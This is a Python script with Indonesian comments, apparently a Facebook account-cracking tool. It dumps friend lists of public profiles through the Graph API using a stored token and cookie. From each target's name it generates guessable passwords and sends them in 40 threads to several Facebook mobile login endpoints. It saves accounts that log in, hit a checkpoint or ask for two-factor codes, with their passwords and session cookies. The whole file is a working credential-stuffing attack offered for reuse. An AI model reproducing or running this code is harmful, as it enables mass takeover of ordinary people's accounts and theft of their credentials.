#####-----[ INI IMPORT MODULE ]-----#####
import requests,bs4,json,os,sys,random,datetime,time,re,rich
from concurrent.futures import ThreadPoolExecutor as thread
from rich.panel import Panel     # Import Panel
from rich import print as rprint # Import Print Rich
from rich.text import Text        # Import Text Rich
                                  # Gwe Pke Text Rich Biar Bisa Di Center Posisi Logo Nya
from rich.columns import Columns as column # Import Columns, Gwe Gunain Ini Cuma Buat..
                                               # Biar Bisa Gabungin 2 Panel Dalam Satu Line Contoh Nya Di Bawah Logo
from bs4 import BeautifulSoup as bsup # Import Bs4

###-------[ NOTE ]--------###
# RECODE? BOLEHH ASAL SERTAKAN NAMA AUTHOR
# SCRIPT INI FREE KLO ADA YANG JUAL KABARIN ANE -_-
# SAYA TIDAK TERLALU PRO PADA HASIL JADI KEMBANGIN SENDIRI YH ^_^
# THANKS FOR BRAYEN XD FOR FUNCTION LOGIN COOKIES
# WA : 083806211924 SEKLIAN INGFOKAN 10K :V
###-------[ NOTE ]--------###

#####-----[ ALL VARIABEL ]-----#####
theid = []  # DUMP ID KE 1
theid2 = [] # DUMP ID KE 2
cp = 0      # REVIEW RESULT CP
ok = 0      # REVIEW RESULT OK
id = []     # DUMP ID
nama = []   # NAME
loop = 0    # LOOPING
a2f = 0     # REVIEW RESULT A2F
session = requests.Session() #RQUESTS
user_agent = [] #DUMP USER AGENT
pws = []        #DUMP PASSWORD
email = []      # REVIEW EMAIL
nomer = []      # REVIEW NOMER

#####------[ COLOR PRINT BIASA ]-----#####
putih = '\33[m'      # PUTIH
merah = '\x1b[1;91m' # MERAH
kuning = '\033[93m'   # KUNING 
hijau = '\x1b[1;92m' # HIJAU 
ungu = '\033[95m'   # UNGU
kuning = '\033[33m'  # KUNING 
biru = '\33[1;96m'  # BIRU 

#####--------[ COLOR PRINT RICH ]--------####
PUTIH = '[bold white]'
MERAH = '[bold red]'
HIJAU = '[bold green]'
KUNING = '[bold yellow]'

###-----[ GENRATE USER AGENT ]-----### # Mau Randomin Ua Bang? Di sini.
                                       # Gunakan Variabel user_agent untuk Menyimpan Ua
user_agent.append("") #Contoh

####-------[ INI SETTING USER AGENT DARI FILE ]--------#### # Fungsi Ini Berfungsi Untuk Mengambil User Agent Dari File 
                                                        # Kamu Bisa Merubah Nya Di File nya atau di menu setting user agent
for x in range(10):
    user = open('user_agent.txt','r').read().splitlines()
    user2 = random.choice(user)
    user_agent.append(user2)

###--------[ INI FUNGSI EXIT ]-------###
def exit():os.system('exit')

###--------[ INI FUNGSI BACK ]-------###
def back():clear();listmenu()

###--------[ INI FUNGSI CLEAR ]-------###
def clear():os.system('clear')

###--------[ INI FUNGSI EROR ]--------###
def error():
    a = Text("ERROR 404 NOT FOUND X _ X",justify='center')
    rprint(Panel(a,width=50,style=f'bold red'))

###--------[ INI LOGO ]--------###
def logo():
    A = """
    ╔╦╗╦ ╦╦ ╔╦╗╦  ╔╗ ╦═╗╦ ╦╔╦╗╔═╗  ╔═╗╔═╗╦═╗╔═╗╔═╗
    ║║║║ ║║  ║ ║  ╠╩╗╠╦╝║ ║ ║ ║╣   ╠╣ ║ ║╠╦╝║  ║╣ 
    ╩ ╩╚═╝╩═╝╩ ╩  ╚═╝╩╚═╚═╝ ╩ ╚═╝  ╚  ╚═╝╩╚═╚═╝╚═╝
    ( Created By Pick Ford )
    """
    B = Text(A,justify='center')
    C = rprint(Panel(B))

###--------[ INI FUNGSI LIST MENU ]-------###
def listmenu():
    clear()
    logo()
    tumbal()
    rprint(Panel("1. crack publik 2. Dump id Massal 3. Brute Force 4. User-Agent Settings"))
    myinput = input('• select : ')
    if myinput in ["1"]:
       dump_publik()
    elif myinput in ["2"]:
         dump_massal()
    elif myinput in ["3"]:
         brute()
    elif myinput in ["4"]:
         ua_setting()
    else:
         error();time.sleep(3)
         back()

###--------[ INI FUNGSI INFORMATION AKUN TUMBAL ]---------###
def tumbal():
    ###----[ Mengambil Data Dari Graph Males Buat Scrap anjj ]----###
    cookie = open(".cookie.txt","r").read() # Get Cookie
    token = open(".token.txt","r").read() # Get Token
    data = requests.get('https://graph.facebook.com/me?&access_token='+token, cookies={'cookie':cookie}) # Data
    lahir = json.loads(data.text)['birthday'] # GET TTL
    gender = json.loads(data.text)['gender']  # GET GENDER / JENIS KELAMIN
    nama = json.loads(data.text)['name'] # Get Name
    user = random.randint(1, 100) # FAKE USER PKE RANDOM SOAL NYA GWE GTW CARA BIKIN LIST ORNG YG LGI MAKE SC GWE
    update = "27 Juni 2023"
    ip = requests.get("http://ip-api.com/json/").json()['query'] # GET IP
    index = [] # Index Columns
    A = f"""
    Nama   : {nama}
    Tanggal Lahir : {lahir}
    Gender : {gender}
    """
    B = f"""
    IP   : {ip}
    Update : {update}
    User : {user}
    """
    C = Panel(A,width=43)
    D = Panel(B,width=44)
    index.append(C)
    index.append(D)
    rprint(column(index))
    
###-------[ INU FUNGSI UP TIME ]--------###
A = {'1':'januari',
           '2':'februari',
           '3':'mart',
           '4':'april',
           '5':'mei',
           '6':'juni',
           '7':'juli',
           '8':'agustus',
           '9':'september',
           '10':'oktober',
           '11':'november',
           '12':'desember'
          }
B = ['senin', 
         'selasa', 
         'rabu', 
         'kamis', 
         'jumat', 
         'sabtu', 
         'minggu'
        ]
lokal = time.localtime()
index = lokal.tm_wday
tahun = datetime.datetime.now().year             # GET TAHUN
bulan = A[(str(datetime.datetime.now().month))]  # GET BULAN
tanggal = datetime.datetime.now().day            # GET TANGGAL
hari = (B[index])                                # GET HARI

###-------[ INI FUNGSI FILE SIMPAN MASIH ]--------###
hasil = f"{hari}-{tanggal}-{bulan}-{tahun}.txt"

###-------[ INI FUNGSI BRUTE FORCE TARGET ]-------###
def brute():
    ids = input(' * Input ID target : ')
    theid.append(ids)
    pws=[]
    try:
         token = open('.token.txt','r').read()
         cookie = open('.cookie.txt','r').read()
         data = requests.get(f'https://graph.facebook.com/{ids}?&access_token='+token, cookies={'cookie':cookie})
         nama_depan = json.loads(data.text)['first_name'].lower()
         nama_belakang = json.loads(data.text)['last_name'].lower()
         full_name = json.loads(data.text)['name'].lower()
         nama_full = json.loads(data.text)['name']
         jumlah = int(input(f' Input Total Add Password : '))
    except ValueError:
        print('Masukan Angka Kontol')
    if jumlah<1 or jumlah>100:
       print('EROR')
    asw = 0
    for no in range(jumlah):
        asw += 1
        _pick_ = input(f' Input Password Ke {asw} : ')
        pws.append(_pick_)
        pws.append(full_name)
        pws.append(nama_belakang+"123")
        pws.append(nama_depan+"123")
        pws.append(nama_depan+"1234")
        pws.append(nama_depan+"12345")
        pws.append(nama_depan+"123456")
        pws.append(nama_depan+"1234567")
        pws.append(nama_depan+"12345678")
        pws.append(nama_depan+"321")
        pws.append(nama_depan+"14")
        pws.append(nama_depan+"01")
        pws.append(nama_depan+"02")
        pws.append(nama_depan+"03")
        pws.append(nama_depan+"04")
        pws.append(nama_depan+"05")
        pws.append(nama_depan+"06")
        pws.append(nama_depan+"07")
        pws.append(nama_depan+"08")
        pws.append(nama_depan+"09")
        pws.append(nama_depan+"11")
        pws.append(nama_depan+"12")
        pws.append(nama_depan+"13")
        pws.append(nama_depan+"14")
        pws.append(nama_depan+"15")
        pws.append(nama_depan+"16")
        pws.append(nama_depan+"17")
        pws.append(nama_depan+"18")
        pws.append(nama_depan+"19")
        pws.append(nama_depan+"21")
        pws.append(nama_depan+"23")
        pws.append(nama_depan+"24")
        pws.append(nama_depan+"25")
    print('')
    run(ids,pws)
    print('\r                                                            ')
    print(f' * Berhasil Brute Force {nama_full}')
    exit()
    
####--------[ INI FUNGSI SETTING AKUN ]-----####
def nextv1():
    rr = random.randint
    print('1. Tua 2. Muda 3. Random')
    _gita_ = input(f'choose :')
    if _gita_ in ['1','01']:
       for v1 in sorted(theid):
           theid2.append(v1)
    elif _gita_ in ['2','02']:
         new = []
         for v2 in sorted(theid):
             new.append(v2)
             newv2=len(new)
             newv3=(newv2-1)
         for c in range(newv2):
            theid2.append(new[newv3])
            newv3 -=1
    elif _gita_ in ['3','03']:
         for v3 in theid:
             jetek = rr(0,len(theid2))
             theid2.insert(jetek,v3)
    else:
         back()

####--------[ INI FUNGSI METHOD MBASIC ]--------####
def play_crack(ids,pws):
	global loop,ok,cp
	ua = str(random.choice(user_agent))
	ses = requests.Session()
	sys.stdout.write(f'\r{x}Running {loop} OK = {ok} CP = {cp}');sys.stdout.flush()
	for pw in pws:
		try:
		    ses.headers.update({'Host': 'mbasic.facebook.com',
		    'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',
		    'upgrade-insecure-requests': '1','user-agent': ua,
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		    'sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors',
		    'sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
		    p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
		    dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
		    "jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
		    "uid":ids,"next":"https://developers.facebook.com/tools/debug/accesstoken/",
		    "flow":"login_no_pin","pass":pw}
		    koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
		    koki+=' m_pixel_ratio=2.625; wd=412x756'
		    heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0',
		    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1',
		    'origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded',
		    'user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		    'x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin',
		    'sec-fetch-mode': 'cors','sec-fetch-dest': 'empty',
		    'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
		    'accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		    post = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
		    if "checkpoint" in post.cookies.get_dict().keys():
		         print(f'\rCP {ids} | {pw}')
		         open(f'result/PICK-CP/{hasil}','a').write(f'{ids}|{pw}\n')
		         cp+=1
		         break
		    elif "c_user" in ses.cookies.get_dict().keys():
		          cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		          print(f'\rOK {ids} | {pw} | {kuki}')
		          open(f'result/PICK-OK/{hasil}','a').write(f'{ids}|{pw}\n')
		          ok+=1
		          break
		    else:
		         continue
		except requests.exceptions.ConnectionError:
		       time.sleep(3)
	loop+=1
	
####-----[ INI FUNGSI UBAH USER AGENT ]----####
def ua_setting():
        rprint(Panel(Text('INPUT YOUR USER AGENT MAXIMAL 10',justify='center'),width=50))
        ua_input = int(input(f'* Input Total Add User Agent : '))
        if ua_input<1 or ua_input>10:
           error()
        ua_v = 0
        for c in range(ua_input):
            ua_v +=1
            ua_put = input(f'* Masukan User Agent Yang Ke {ua_v} : ')
            open(f'user_agent.txt','a').write(f'{ua_put}\n')
        list_ua = open('user_agent.txt','r').read().splitlines()
        jumlah_ua = len(list_ua)
        rprint(Panel(Text(f'JUMLAH USER AGENT YANG ADA PADA FILE {jumlah_ua}',justify='center'),width=50))

####-----[ INI FUNGSI DUMP PUBLIK ]-----#####
def dump_publik():
    token = open('.token.txt').read()
    cookie = open('.cookie.txt').read()
    pick_id = input('Masukan Id Publik: ')
    data = requests.get(f'https://graph.facebook.com/v16.0/{pick_id}?fields=friends.limit(5000)&access_token={token}',cookies={'cookie': cookie}).json()
    for get in data['friends']['data']:
        try:
            theid.append(get['id']+'|'+get['name'])
        except:continue
    print(f'Succes Dump :'+str(len(theid)))
    nextv1()
    __password__()
    
####-----[ INI FUNGSI DUMP ID MASSAL ]-----####           
def dump_massal():
    cookie = open('.cookie.txt').read()
    token = open('.token.txt').read()
    try:
        total = int(input('* Input Total Id : '))
    except: pass
    if total<1 or total >100:
       exit()
    A = 0
    for no in range(total):
        A+=1
        ide = input(f'* Masukan Id Ke '+str(A)+' : ')
        data = requests.get(f'https://graph.facebook.com/v16.0/{ide}?fields=friends.limit(5000)&access_token={token}',cookies={'cookie': cookie}).json()
        try:
            for get in data['friends']['data']:
                try:
                    theid.append(get['id']+'|'+get['name'])
                except:continue
        except:continue
    print('succes dump '+str(len(theid))+' Id')
    nextv1()
    
###-----[ Password Generator ]-----###
def __password__():
	print('Hasil Akan Tersimpan di folder RSEULT\n')
	try:
		with thread(max_workers=40) as gass:
			for idd in theid2:
				pws = []
				ids,name = idd.split('|')[0],idd.split('|')[1].lower()
				depan = name.split(' ')[0]
				if len(depan)<=1:
					tengah = name.split(' ')[1]
					pws.append('ANJAY12')
					pws.append(name)
					pws.append(tengah)
					pws.append(tengah+'123')
					pws.append(tengah+'1234')
				elif len(depan)>=2:
					pws.append(name)
					pws.append(depan)
					pws.append(depan+'123')
					pws.append(depan+'1234')
					pws.append(depan+'12345')
					pws.append(depan+'123456')
					pws.append(depan+'1234567')
					pws.append(depan+'12345678')
					pws.append(depan+'321')
				else:
					pws.append(name)
					pws.append('sayang')
					pws.append('sayangku')
					pws.append('kontol123')
					pws.append('bismillah')
					pws.append('anjing123')
				gass.submit(play_crack,ids,pws)
		print('\r                                                            ')
		print(f' * Berhasil Crack {len(theid)} ID')
		print(f' * Hasil Ok = {ok} | Cp = {cp} \n')
		exit()
	except:
		print('Terjadi kesalahan pada PASSWORD')

#####------[ INI FUNGSI METHOD BRUTE FORCE ]--------######
def run(ids,pws):
	global loop,ok,cp,a2f
	ua = str(random.choice(user_agent))
	sys.stdout.write(f'\rRunning...');sys.stdout.flush()
	cookie = open('.cookie.txt','r').read()
	token = open('.token.txt','r').read()
	data = requests.get(f'https://graph.facebook.com/{ids}?&access_token='+token, cookies={'cookie':cookie})
	nama = json.loads(data.text)['name']
	for pw in pws:
		try:
			session.headers.update({
			'authority':	'free.facebook.com',
			'accept':	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'accept-language':	'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			'cache-control':	'no-cache',
			'content-type':	'application/x-www-form-urlencoded',
			'origin':	'https://free.facebook.com',
			'pragma':	'no-cache',
			'referer':	'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
			'sec-ch-prefers-color-scheme':	'light',
			'sec-ch-ua':	'"Not:A-Brand";v="99", "Chromium";v="112"',
			'sec-ch-ua-full-version-list':	'"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
			'sec-ch-ua-mobile':	'?1',
			'sec-ch-ua-platform':	'"Android"',
			'sec-ch-ua-platform-version':	'"13.0.0"',
			'sec-fetch-dest':	'document',
			'sec-fetch-mode':	'navigate',
			'sec-fetch-site':	'same-origin',
			'sec-fetch-user':	'?1',
			'upgrade-insecure-requests':	'1',
			'user-agent': ua
			})
			req = session.get('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			cookie = (";").join([ "%s=%s" % (key, value) for key, value in req.cookies.get_dict().items() ])
			data = {
			'bi_xrwh':	'0',
			'email':	ids,
			'jazoest':	re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
			'li':	re.search('name="li" value="(.*?)"', str(req.text)).group(1),
			'login':	'Masuk',
			'lsd':	re.search('name="lsd" value="(.*?)"', str(req.text)).group(1),
			'm_ts':	re.search('name="m_ts" value="(.*?)"', str(req.text)).group(1),
			'pass':	pw,
			'try_number':	'0',
			'unrecognized_tries':	'0'
			}
			header = {
			'authority':	'free.facebook.com',
			'accept':	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'accept-encoding':	'gzip, deflate, br',
			'accept-language':	'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			'cache-control':	'no-cache',
			'content-length':	'162',
			'content-type':	'application/x-www-form-urlencoded',
			'origin':	'https://free.facebook.com',
			'pragma':	'no-cache',
			'referer':	'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
			'sec-ch-prefers-color-scheme':	'light',
			'sec-ch-ua':	'"Not:A-Brand";v="99", "Chromium";v="112"',
			'sec-ch-ua-full-version-list':	'"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
			'sec-ch-ua-mobile':	'?1',
			'sec-ch-ua-platform':	'"Android"',
			'sec-ch-ua-platform-version':	'"13.0.0"',
			'sec-fetch-dest':	'document',
			'sec-fetch-mode':	'navigate',
			'sec-fetch-site':	'same-origin',
			'sec-fetch-user':	'?1',
			'upgrade-insecure-requests':	'1',
			'user-agent': ua
			}
			post = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',headers=header,cookies={'cookie':cookie},data=data,allow_redirects=False)
			if 'c_user' in post.cookies.get_dict():
				cookie = (";").join([ "%s=%s" % (key, value) for key, value in post.cookies.get_dict().items() ])
				cookie+=' m_pixel_ratio=2.625; wd=412x756'
				print(f'\r* Status : Success                                      ')
				print(f'* Nama   : {nama}')
				print(f'* Email  : {ids}')
				print(f'* Pass   : {pw}')
				print(f'* Cookie : {cookie}')
				open('result/PICK-OK/{hasil}','a').write(f'{ids}|{pw}\n')				
				ok+=1
				break
			elif 'checkpoint' in post.cookies.get_dict():
				cook = (";").join([ "%s=%s" % (key, value) for key, value in post.cookies.get_dict().items() ])
				req_cp = session.get('https://free.facebook.com/checkpoint/?ref=dbl&_rdr',cookies={'cookie':cook})
				if str(re.findall('div\ title\=\"(.*?)\"',req_cp.text)).split("'")[1] in ['Masukan Kode Masuk untuk Melanjutkan','Enter login code to continue']:
				    print('\r * Status : Authen / a2f                          ')
				    print(f' * Nama   : {nama}')
				    print(f' * Email  : {ids}')
				    print(f' * Pass   : {pw}')
				    print(f' * User-Agent :{ua}\n')
				    open(f'result/PICK-A2F/{hasil}','a').write(f'{ids}|{pw}\n')
				    a2f+=1
				    break
				else:
				    print('\r * Status : Checkpoint                            ')
				    print(f' * Nama   : {nama}')
				    print(f' * Email  : {ids}')
				    print(f' * Pass   : {pw}')
				    print(f' * User-Agent : {ua}\n')
				    open(f'result/PICK-CP/{hasil}','a').write(f'{ids}|{pw}\n')
				    cp+=1
				    break
			else:
			     continue
		except Exception as e:print('\n',e)
	loop+=1

	
#####----------[ FUNGSI METHOD M.FACEBOOK ]-----------###2
def mfacebook(ids,pws):
	global loop,ok,cp
	ua = str(random.choice(user_agent))
	sys.stdout.write(f'\r{putih}* Running {loop} OK = {ok} CP = {cp} A2F = {a2f} ');sys.stdout.flush()
	for pw in pws:
		try:
		    link = session.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=847163265704696&kid_directed_site=0&app_id=847163265704696&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D847163265704696%26auth_type%3Dreauthenticate%26cbt%3D1687630332079%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2e57476b2475f%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%26client_id%3D847163265704696%26display%3Dtouch%26domain%3Dpointblank.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpointblank.id%252Flogin%252Fform%26locale%3Did_ID%26logger_id%3Df1729dfd1a4d3e%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df317f443e977c1c%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%2526frame%253Df2b0098b1ad1ac4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv3.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df317f443e977c1c%26domain%3Dpointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpointblank.id%252Fff9c684fc21eac%26relation%3Dopener%26frame%3Df2b0098b1ad1ac4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
		    data = {
		    'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
		    'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
		    'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
		    'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
		    'email': ids,
		    'prefill_contact_point': ids,
		    'prefill_source': 'browser_onload',
		    'prefill_type': 'contact_point',
		    'first_prefill_source': 'browser_dropdown',
		    'first_prefill_type': 'contact_point',
		    'had_cp_prefilled': 'true',
		    'had_password_prefilled': 'false',
		    'is_smart_lock': 'false',
		    'bi_xrwh': '0',
		    'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
		    'fb_dtsg': '',
		    'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
		    'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
		    '__dyn': '',
		    '__csr': '',
		    '__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
		    '__a': '',
		    '__user':0
		    }
		    headers = {'Host': 'm.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=847163265704696&kid_directed_site=0&app_id=847163265704696&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D847163265704696%26auth_type%3Dreauthenticate%26cbt%3D1687630332079%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2e57476b2475f%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%26client_id%3D847163265704696%26display%3Dtouch%26domain%3Dpointblank.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpointblank.id%252Flogin%252Fform%26locale%3Did_ID%26logger_id%3Df1729dfd1a4d3e%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df317f443e977c1c%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%2526frame%253Df2b0098b1ad1ac4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv3.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df317f443e977c1c%26domain%3Dpointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpointblank.id%252Fff9c684fc21eac%26relation%3Dopener%26frame%3Df2b0098b1ad1ac4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
		    post = session.post('https://m.facebook.com/login/device-based/login/async/?api_key=847163265704696&auth_token=fd5889601e73a552f7c991ba2313b575&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D847163265704696%26auth_type%3Dreauthenticate%26cbt%3D1687630332079%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2e57476b2475f%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%26client_id%3D847163265704696%26display%3Dtouch%26domain%3Dpointblank.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpointblank.id%252Flogin%252Fform%26locale%3Did_ID%26logger_id%3Df1729dfd1a4d3e%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df317f443e977c1c%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%2526frame%253Df2b0098b1ad1ac4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv3.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=847163265704696&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df317f443e977c1c%26domain%3Dpointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpointblank.id%252Fff9c684fc21eac%26relation%3Dopener%26frame%3Df2b0098b1ad1ac4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=data,headers=headers)
		    if "checkpoint" in post.cookies.get_dict().keys():
		         print(f'\r{kuning} AKUN CP {ids} | {pw}')
		         open(f'result/PICK-CP/{hasil}','a').write(ids+'|'+pw+'\n')
		         cp+=1
		         break
		    elif "c_user" in session.cookies.get_dict().keys():
		           cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		           cookie+=' m_pixel_ratio=2.625; wd=412x756'
		           print(f'\r{hijau} AKUN OK {ids} | {pw} | {cookie}')
		           open(f'result/PICK-OK/{hasil}','a').write(f'{ids}|{pw}')
		           ok+=1
		           break
		    else:
		         continue
		except requests.exceptions.ConnectionError:
		       time.sleep(3)
	loop+=1
		
if __name__=='__main__':
  os.system('git pull')
  os.system('mkdir result')
  os.system('mkdir ./result/PICK-CP')
  os.system('mkdir ./result/PICK-OK')
  clear()
  listmenu()
